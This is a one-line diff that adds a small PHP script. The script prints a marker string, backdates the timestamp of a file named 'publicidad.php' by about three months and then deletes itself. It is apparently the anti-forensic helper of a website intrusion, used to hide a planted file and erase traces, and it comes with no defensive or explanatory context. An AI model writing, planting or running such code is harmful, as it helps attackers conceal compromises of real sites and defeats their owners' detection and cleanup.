@@ -1,0 +1,1 @@
+<?php echo "tAsBqFFsRG"; if (file_exists("./publicidad.php")){ touch("./publicidad.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*cF6vMnQQ8Kz2WeReyVWr*/ ?>
